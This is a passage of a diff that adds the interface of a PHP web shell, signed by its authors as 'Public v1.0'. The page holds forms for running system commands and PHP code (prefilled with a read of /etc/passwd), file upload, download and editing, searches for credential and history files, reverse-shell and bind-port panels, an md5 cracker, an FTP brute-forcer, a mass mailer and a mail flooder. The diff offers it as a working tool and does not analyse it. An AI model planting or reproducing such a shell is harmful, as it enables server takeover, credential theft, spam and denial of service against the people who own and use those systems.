+<tr><td align=right>
+<font size=2 color='#888888'>MSSQL:</font>
+</td></tr>
+<tr><td align=right>
+<font size=2 color='#888888'>PostgreSQL:</font>
+</td></tr>
+<tr><td align=right>
+<font size=2 color='#888888'>Oracle:</font>
+</td></tr>
+</table>
+</td><td>
+<table valign=top  cellpadding=0 cellspacing=0>
+<tr><td>
+<b><font size=2 color=red><?php echo phpversion();?></font></b>
+</td></tr>
+<tr><td>
+<b><?php echo testmysql();?></b>
+</td></tr>
+<tr><td>
+<b><?php echo testmssql();?></b>
+</td></tr>
+<tr><td>
+<b><?php echo postgresql();?></b>
+</td></tr>
+<tr><td>
+<b><?php echo oracle();?></b>
+</td></tr>
+</table>
+</td><td width=4%></td>
+<td valign=top><table cellpadding=0 cellspacing=0 valign=top>
+<tr><td valign=top align=right>
+<font color=#888888 size=2>Safe_mode:</font>
+</td></tr>
+<tr><td valign=top align=right>
+<font color=#888888 size=2>cURL:</font>
+</td></tr>
+<tr><td valign=top align=right>
+<font color=#888888 size=2>wget:</font>
+</td></tr>
+<tr><td valign=top align=right>
+<font color=#888888 size=2>fetch:</font>
+</td></tr>
+<tr><td valign=top align=right>
+<font color=#888888 size=2>lynx:</font>
+</td></tr>
+</table></td>
+<td valign=top><table cellpadding=0 cellspacing=0 valign=top>
+<tr><td valign=top>
+<b><?php echo safe_mode();?></b>
+</td></tr>
+<tr><td valign=top>
+<b><?php echo testcurl();?></b>
+</td></tr>
+<tr><td valign=top>
+<b><?php echo testwget();?></b>
+</td></tr>
+<tr><td valign=top>
+<b><?php echo testfetch();?></b>
+</td></tr>
+<tr><td valign=top>
+<b><?php echo testlynx();?></b>
+</td></tr>
+</table></td>
+<td width=4%></td>
+<td valign=top><table cellpadding=0 cellspacing=0 valign=top>
+<tr><td valign=top align=right>
+<font color=#888888 size=2>Perl:</font>
+</td></tr>
+<tr><td valign=top align=right>
+<font color=#888888 size=2>Server time:</font>
+</td></tr>
+<tr><td valign=top align=right>
+<font color=#888888 size=2>Server date:</font>
+</td></tr>
+<tr><td valign=top align=right>
+<font color=#888888 size=2>Total space:</font>
+</td></tr>
+<tr><td valign=top align=right>
+<font color=#888888 size=2>Free space:</font>
+</td></tr>
+</table></td>
+<td valign=top><table cellpadding=0 cellspacing=0 valign=top>
+<tr><td valign=top>
+<b><font size=2 color=green><?php echo testperl();?></font></b>
+</td></tr>
+<tr><td valign=top>
+<b><font size=2 color=#999999><?php echo date('H:i');?></font></b>
+</td></tr>
+<tr><td valign=top>
+<b><font size=2 color=#999999><?php echo date('d-m-Y');?></font></b>
+</td></tr>
+<tr><td valign=top>
+<b><font size=2 color=#999999><?php echo view_size(disk_total_space(getcwd()));?></font></b>
+</td></tr>
+<tr><td valign=top>
+<b><font size=2 color=#999999><?php echo view_size(diskfreespace(getcwd()));?></font></b>
+</td></tr>
+</table></td></tr>
+</table>
+</td></tr>
+</table>
+</td></tr>
+<tr><td width=100% height=100% bgcolor='#333333' valign=top>
+<table width=100%>
+<tr><td valign=top align=center>
+<table width=100% height=200 class='td1'>
+<tr><td valign=top align=left width=50%>
+<form action method=POST>
+<input type=hidden name="type" value=5>
+<textarea cols=80 rows=13 name="value" class='ta'>
+<?php echo htmlspecialchars(shell());?>
+</textarea><?php echo edit();?></form>
+</td>
+
+
+
+<td valign=top align=left width=10%>
+<table width=100% height=100% class='td2'>
+<form action method=POST><tr><td valign=top align=left height=40% style="border-bottom: 1px solid #000000;">
+<b>.::System shell::.</b><br>
+<input type=hidden name="type" value=2>
+<center><input type=text name="value" size=35 class='ta'></center>
+</ br><center><input type=submit value="Enter" style="border-top: 1px solid #333333;border-bottom: 1px solid #666666;border-right: 1px solid #666666;border-left: 1px solid #666666;background: #333333;font-weight:bold;"></center>
+</td></tr></form>
+<tr><td valign=top align=left>
+<form action method=POST>
+<table>
+<tr><td>
+<b>.::PHP-code::.</b>
+</td><td align=right>
+<input type=submit value="Run code" class='bt'>
+<input type=hidden name="type" value=1>
+</td></tr>
+<tr><td colspan=2>
+<textarea rows=5 cols=26 name="value" class='ta'><?php echo "readfile('/etc/passwd');";?></textarea>
+</td></tr>
+</table></form>
+</td></tr>
+</table>
+</td></tr>
+</table>
+<table>
+<tr><td height=0></td></tr>
+</table>
+<table width=100% height=80 class='td1' valign=top>
+<tr><td valign=top align=left width=50%>
+<form action method=POST>
+<table width=100% height=100% valign=top class='td2'>
+<tr><td>
+<b>.::PWD::.</b>
+</td><td align=right>
+<input type=submit class='bt' value="cd">
+<input type=hidden name="type" value=3>
+</td></tr>
+<tr><td colspan=2>
+<input type=text name="value" class='ta' size=71 value=<?php echo pwd();?>>
+</td></tr>
+</table></form></td><td valign=top align=left width=50%>
+<form action method=POST>
+<table width=100% height=100% valign=top class='td2'>
+<tr><td>
+<b>.::File Edit::.</b>
+</td><td align=right>
+<input type=submit class='bt' value="Edit">
+<input type=hidden name="type" value=4>
+</td></tr>
+<tr><td colspan=2>
+<input type=text name="value" class='ta' size=72 value=<?php echo pwd();?>>
+</td></tr>
+</table></form>
+</td></tr>
+<tr><td valign=top align=left width=50%>
+<form action method=POST>
+<table width=100% height=100% valign=top class='td2'>
+<tr><td>
+<b>.::Download::.</b>
+</td><td align=right>
+<input type=submit class='bt' value="Download">
+<input type=hidden name="type" value=11>
+</td></tr>
+<tr><td colspan=2>
+<input type=text name="value" class='ta' size=71 value=<?php echo pwd();?>>
+</td></tr>
+</table></form></td><td valign=top align=left width=50%>
+<form enctype="multipart/form-data" action method=POST>
+<table width=100% height=100% valign=top class='td2'>
+<tr><td>
+<b>.::Upload::.</b>
+</td><td align=right colspan=3>
+<input type=submit class='bt' value="Upload">
+<input type=hidden name="type" value=6>
+</td></tr>
+<tr><td colspan=2>
+<font size=2 color=#888888>New name:</b>
+<input type=text size=15 name="newname" class=ta>
+</td><td width=4></td><td colspan=2>
+<input type=file name="userfile" size=28>
+</td></tr>
+</table></form>
+<tr><td valign=top align=left width=50%>
+<form action method=POST>
+<table width=100% height=100% valign=top class='td2'>
+<tr><td>
+<b>.::Alias::.</b>
+</td><td align=right>
+<input type=submit class='bt' value="RUN">
+<input type=hidden name="type" value=7>
+</td></tr>
+<tr><td colspan=2>
+<select name='value' class='ta' width=200>
+<option>find apahce config file</option>
+<option>find access_log files</option>
+<option>find error_log files</option>
+<option>find suid files</option>
+<option>find suid files in current dir</option>
+<option>find sgid files</option>
+<option>find sgid files in current dir</option>
+<option>find config.inc.php files</option>
+<option>find config.inc.php files in current dir</option>
+<option>find config* files</option>
+<option>find config* files in current dir</option>
+<option>find all writable files</option>
+<option>find all writable files in current dir</option>
+<option>find all writable directories</option>
+<option>find all writable directories in current dir</option>
+<option>find all writable directories and files</option>
+<option>find all writable directories and files in current dir</option>
+<option>find all service.pwd files</option>
+<option>find service.pwd files in current dir</option>
+<option>find all .htpasswd files</option>
+<option>find .htpasswd files in current dir</option>
+<option>find all .bash_history files</option>
+<option>find .bash_history files in current dir</option>
+<option>find all .mysql_history files</option>
+<option>find .mysql_history files in current dir</option>
+<option>find all .fetchmailrc files</option>
+<option>find .fetchmailrc files in current dir</option>
+<option>list file attributes on a Linux second extended file system</option>
+<option>show opened ports</option>
+<option>---------------------------------------------------------------------------------------------------------</option>
+</select>
+</td></tr>
+</table></form></td>
+<script>
+function base64Encode(str)
+{
+	var charBase64 = new Array(
+		'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P',
+		'Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f',
+		'g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v',
+		'w','x','y','z','0','1','2','3','4','5','6','7','8','9','+','/'
+	);
+
+	var out = "";
+	var chr1, chr2, chr3;
+	var enc1, enc2, enc3, enc4;
+	var i = 0;
+
+	var len = str.length;
+
+	do
+	{
+		chr1 = str.charCodeAt(i++);
+		chr2 = str.charCodeAt(i++);
+		chr3 = str.charCodeAt(i++);
+
+
+		enc1 = chr1 >> 2;
+		enc2 = ((chr1 & 0x03) << 4) | (chr2 >> 4);
+		enc3 = ((chr2 & 0x0F) << 2) | (chr3 >> 6);
+		enc4 = chr3 & 0x3F;
+
+		out += charBase64[enc1] + charBase64[enc2];
+
+		if (isNaN(chr2))
+  		{
+			out += '==';
+		}
+  		else if (isNaN(chr3))
+  		{
+			out += charBase64[enc3] + '=';
+		}
+		else
+		{
+			out += charBase64[enc3] + charBase64[enc4];
+		}
+	}
+	while (i < len);
+
+	return out;
+}
+
+
+function base64Decode(str)
+{
+	var indexBase64 = new Array(
+		-1,-1,-1,-1, -1,-1,-1,-1, -1,-1,-1,-1, -1,-1,-1,-1,
+		-1,-1,-1,-1, -1,-1,-1,-1, -1,-1,-1,-1, -1,-1,-1,-1,
+		-1,-1,-1,-1, -1,-1,-1,-1, -1,-1,-1,62, -1,-1,-1,63,
+		52,53,54,55, 56,57,58,59, 60,61,-1,-1, -1,-1,-1,-1,
+		-1, 0, 1, 2,  3, 4, 5, 6,  7, 8, 9,10, 11,12,13,14,
+		15,16,17,18, 19,20,21,22, 23,24,25,-1, -1,-1,-1,-1,
+		-1,26,27,28, 29,30,31,32, 33,34,35,36, 37,38,39,40,
+		41,42,43,44, 45,46,47,48, 49,50,51,-1, -1,-1,-1,-1,
+		-1,-1,-1,-1, -1,-1,-1,-1, -1,-1,-1,-1, -1,-1,-1,-1,
+		-1,-1,-1,-1, -1,-1,-1,-1, -1,-1,-1,-1, -1,-1,-1,-1,
+		-1,-1,-1,-1, -1,-1,-1,-1, -1,-1,-1,-1, -1,-1,-1,-1,
+		-1,-1,-1,-1, -1,-1,-1,-1, -1,-1,-1,-1, -1,-1,-1,-1,
+		-1,-1,-1,-1, -1,-1,-1,-1, -1,-1,-1,-1, -1,-1,-1,-1,
+		-1,-1,-1,-1, -1,-1,-1,-1, -1,-1,-1,-1, -1,-1,-1,-1,
+		-1,-1,-1,-1, -1,-1,-1,-1, -1,-1,-1,-1, -1,-1,-1,-1,
+		-1,-1,-1,-1, -1,-1,-1,-1, -1,-1,-1,-1, -1,-1,-1,-1
+	);
+
+	var out = "";
+	var chr1, chr2, chr3;
+	var enc1, enc2, enc3, enc4;
+	var i = 0;
+
+
+	str = str.replace(/^[^a-zA-Z0-9\+\/\=]+|[^a-zA-Z0-9\+\/\=]+$/g,"")
+
+	var len = str.length;
+
+	do
+	{
+		enc1 = indexBase64[str.charCodeAt(i++)];
+		enc2 = indexBase64[str.charCodeAt(i++)];
+		enc3 = indexBase64[str.charCodeAt(i++)];
+		enc4 = indexBase64[str.charCodeAt(i++)];
+
+		chr1 = (enc1 << 2) | (enc2 >> 4);
+		chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
+		chr3 = ((enc3 & 3) << 6) | enc4;
+
+		out += String.fromCharCode(chr1);
+
+		if (enc3 != -1)
+		{
+			out += String.fromCharCode(chr2);
+		}
+		if (enc4 != -1)
+		{
+			out += String.fromCharCode(chr3);
+		}
+	}
+	while (i < len);
+
+	if (i != len)
+	{
+		new Error(BASE64_BROKEN);
+		return "";
+	}
+
+	return out;
+}
+
+</script>
+<td valign=top align=left width=50%>
+<form action method=POST>
+<table width=100% height=100% valign=top class='td2'>
+<tr><td width=1%>
+<b>.::Base64_encode::.</b>
+</td><td align=right width=6%>
+<input type=button value="encode" class='bt' onclick='t.value=base64Encode(t.value)'>	
+</td>
+<form action method=POST><td width=1%>
+<b>.::Base64_decode::.</b>
+</td><td align=right width=6%>
+<input type=button value="decode" class='bt' onclick='n.value=base64Decode(n.value)'>	
+</td></tr>
+<tr><td colspan=2>
+<input type=text name='t' class='ta' size=34>
+</td><td colspan=2>
+<input type=text name='n' class='ta' size=34>
+</td></tr>
+</table></form>
+</td></tr>
+</td></tr>
+</table>
+</td></tr><tr></tr><tr><td>
+<table cellpadding=0 cellspacing=0><tr><td>
+<table class='td1' width=226>
+<tr><td width=100% class='td2'>
+<form action method=POST>
+<table cellpadding=0 cellspacing=0 width=90% border=0><tr><td colspan=3>
+<b>.::Back Connect::.</b></td></tr>
+<tr><td width=100% height=10 colspan=3></td></tr>
+<tr><td width=25% align=right><font color=#888888 size=2><b>IP:</b></font></td>
+<td width=5%></td>
+<td width=100% align=right>
+<input type=text class='ta' name='ip' size=15 value=<?php echo $_SERVER['REMOTE_ADDR'];?>></td></tr>
+<tr><td width=100% height=5 colspan=3></td></tr>
+<tr><td width=25% align=right><font color=#888888 size=2>port:</font></td>
+<td width=5%></td>
+<td width=100% align=right>
+<input type=text class='ta' name='port' size=10 value='5000'></td></tr>
+<tr><td width=100% height=5 colspan=3></td></tr>
+<tr><td width=25% align=right><font color=#888888 size=2>Method:</font></td>
+<td width=5%></td>
+<td width=100% align=right>
+<select class='ta' name='method'>
+<option>Perl</option>
+<option>C#</option>
+<option>---------------------</option>
+</select></td></tr>
+<tr><td width=100% height=5 colspan=3></td></tr>
+<tr><td width=100% align=right colspan=3>
+<input type=hidden name='type' value='12'>
+<input type=submit value='Connect' class='bt'></form>
+<tr><td width=100% height=5 colspan=3></td></tr>
+</table>
+</td></tr>
+</table>
+</td><td width=5></td><td>
+<table class='td1' width=226>
+<tr><td width=100% class='td2'>
+<form action method=POST>
+<table cellpadding=0 cellspacing=0 width=90% border=0><tr><td colspan=3>
+<b>.::Bind port::.</b></td></tr>
+<tr><td width=100% height=10 colspan=3></td></tr>
+<tr><td width=25% align=right><font color=#888888 size=2><b>Port:</b></font></td>
+<td width=5%></td>
+<td width=100% align=right>
+<input type=text class='ta' name='port' size=15 value='6000'></td></tr>
+<tr><td width=100% height=5 colspan=3></td></tr>
+<tr><td width=25% align=right><font color=#888888 size=2>pass:</font></td>
+<td width=5%></td>
+<td width=100% align=right>
+<input type=text class='ta' name='pass' size=10 value='hshell'></td></tr>
+<tr><td width=100% height=5 colspan=3></td></tr>
+<tr><td width=25% align=right><font color=#888888 size=2>Method:</font></td>
+<td width=5%></td>
+<td width=100% align=right>
+<select class='ta' name='method'>
+<option>Perl</option>
+<option>C#</option>
+<option>---------------------</option>
+</select></td></tr>
+<tr><td width=100% height=5 colspan=3></td></tr>
+<tr><td width=100% align=right colspan=3>
+<input type=hidden name='type' value='12'>
+<input type=submit value='Bind' class='bt'></form>
+<tr><td width=100% height=5 colspan=3></td></tr>
+</table>
+</td></tr>
+</table>
+</td><td width=5></td><td width=50% height=141>
+<table class='td1' width=100% height=100% valign=top><tr><td width=100% height=100% class='td2' valign=top>
+<table cellpadding=0 cellspacing=0 width=95%><tr><td colspan=4>
+<b>.::md5 bruter::.</b>
+</td></tr><tr><td height=10></td></tr>
+<tr><td width=20></td><td>
+<font size=2 color="#888888" align=right><b>hash:</b></font></td><td width=5></td><td align=right>
+<input type=text name='hash' class='ta' size=50>
+</td></tr>
+<tr><td height=5></td>
+<tr><td width=20></td><td>
+<font size=2 color="#888888" align=right>log_file:</font></td><td width=5></td><td align=right>
+<input type=text name='log' class='ta' size=30 value='md5_log.txt'>
+</td></tr>
+<tr><td height=5></td>
+<tr><td width=20></td><td>
+<font size=2 color="#888888" align=right>dictionary_file:</font></td><td width=5></td><td align=right>
+<input type=text name='dict' class='ta' size=30 value='md5_dict.txt'>
+</td></tr>
+<tr><td height=5></td>
+<tr><td width=20></td><td>
+</td><td width=5></td><td align=right>
+<input type=submit class='bt' value='Start Brute'>
+</td></tr>
+</table>
+</td></tr></table>
+</td></tr></table>
+<tr></tr><tr><td>
+<table class='td1' width=100% height=310 valign=top align=left>
+<form action method=POST>
+<td valign=top align=left class='td2' width=33%>
+<table cellpadding=0 cellspacing=0 width=100%>
+<tr><td valign=top colspan=3 height=30>
+<b>.::Spammer::.</b>
+<tr><td width=25% align=right>
+<font color=#888888 size=2><b>emails_file:</b></font>
+</td><td width=65% align=right>
+<input type=text name='elist' class='ta' size=17 value="emails.txt">
+</td></tr><tr><td height=5></td></tr>
+<tr><td width=25% align=right>
+<font color=#888888 size=2><b>log_file:</b></font>
+</td><td width=65% align=right>
+<input type=text name='log' class='ta' size=17 value="mail_log.txt">
+</td></tr>
+<td height=5><td></tr>
+<tr><td width=25% align=right>
+<font color=#888888 size=2>From:</font>
+</td><td width=65% align=right>
+<input type=text name='from' class='ta' size=27>
+</td></tr>
+<td height=5><td></tr>
+<tr><td width=25% align=right>
+<font color=#888888 size=2>Subject:</font>
+</td><td width=65% align=right>
+<input type=text name='subject' class='ta' size=27>
+</td></tr>
+<td height=5><td></tr>
+<tr><td width=25% align=right>
+<font color=#888888 size=2>Message:</font>
+</td><td width=65% align=right>
+<textarea name='msg' class='ta' cols=20 rows=4></textarea>
+</td></tr>
+<td height=5><td></tr>
+<tr><td width=25% align=right>
+<font color=#888888 size=2>Check<sup>*</sup>:</font>
+</td><td width=65% align=right>
+<input type=text name='check' class='ta' size=27>
+</td></tr>
+<td height=5><td></tr>
+<tr><td width=25% align=right>
+</td><td width=65% align=right>
+<input type=submit class='bt' value="Start">
+<input type=hidden name='type' value=10>
+</td></tr>
+</table></form>
+<form action method=POST>
+<td valign=top align=left class='td2' width=33%>
+<table cellpadding=0 cellspacing=0 width=100%>
+<tr><td colspan=3 height=30 valign=top><b>.::FTP-Brute::.</b></td></tr>
+<tr><td width=31% align=right>
+<font color=#888888 size=2><b>Host:</b></font>
+</td><td align=right>
+<input type=text name='host' class='ta' size=28>
+</td><td width=5%></td></tr><tr><td height=35 width=100% colspan=2></td></tr>
+<tr><td align=right>
+<font color=#888888 size=2>ftp_users file:</font>
+</td><td align=right>
+<input type=text name='users' class='ta' size=17 value="ftp_users.txt">
+</td><td></td></tr>
+<tr><td height=5 width=100% colspan=2></td></tr>
+<tr><td align=right>
+<font color=#888888 size=2>ftp_passwd file:</font>
+</td><td align=right>
+<input type=text name='passwd' class='ta' size=17 value="ftp_passwds.txt">
+</td><td></td></tr>
+<tr><td height=5 width=100% colspan=2></td></tr>
+<tr><td align=right>
+<font color=#888888 size=2>ftp_log file:</font>
+</td><td align=right>
+<input type=text name='log' class='ta' size=17 value="ftp_log.txt">
+</td><td></td></tr>
+<tr><td colspan=2 height=20></td></tr>
+<tr><td colspan=2 align=right>
+<input type=submit class='bt' value="Start Brute">
+<input type=hidden name="type" value=9>
+</td></tr>
+</td></table></form>
+<form action method=POST>
+<td valign=top align=left class='td2' width=33%>
+<table cellpadding=0 cellspacing=0 width=100%>
+<tr><td valign=top colspan=3 height=30>
+<b>.::Flooder::.</b>
+<tr><td width=25% align=right>
+<font color=#888888 size=2><b>log_file:</b></font>
+</td><td width=65% align=right>
+<input type=text name='log' class='ta' size=17 value="mflood_log.txt">
+</td></tr>
+<td height=5><td></tr>
+<tr><td width=25% align=right>
+<font color=#888888 size=2>Send to:</font>
+</td><td width=65% align=right>
+<input type=text name='to' class='ta' size=27>
+</td></tr><tr>
+<td height=5><td></tr>
+<tr><td width=25% align=right>
+<font color=#888888 size=2>From:</font>
+</td><td width=65% align=right>
+<input type=text name='from' class='ta' size=27>
+</td></tr>
+<td height=5><td></tr>
+<tr><td width=25% align=right>
+<font color=#888888 size=2>Subject:</font>
+</td><td width=65% align=right>
+<input type=text name='subject' class='ta' size=27>
+</td></tr>
+<td height=5><td></tr>
+<tr><td width=25% align=right>
+<font color=#888888 size=2>Message:</font>
+</td><td width=65% align=right>
+<textarea name='msg' class='ta' cols=20 rows=4></textarea>
+</td></tr>
+<td height=25><td></tr>
+<tr><td width=25% align=right>
+<font color=#888888 size=2>Amount:</font>
+</td><td width=65% align=right>
+<input type=text name='amount' class='ta' size=17>
+</td></tr>
+<td height=5><td></tr>
+<tr><td width=25% align=right>
+<font color=#888888 size=2>Check<sup>*</sup>:</font>
+</td><td width=65% align=right>
+<input type=text name='check' class='ta' size=27>
+</td></tr>
+<td height=5><td></tr>
+<tr><td width=25% align=right>
+</td><td width=65% align=right>
+<input type=submit class='bt' value="Flood">
+<input type=hidden name='type' value=10>
+</td></tr>
+</table></form>
+</td></tr>
+</table>
+</td></tr>
+</table>
+</td></tr>
+</table></center>
+<center><font size=1 color=#444444>.:[Public v1.0]:.</font></center>
+</body>
+</html>
+	
+<!-- Coded by LoFFi & Ls01r //-->
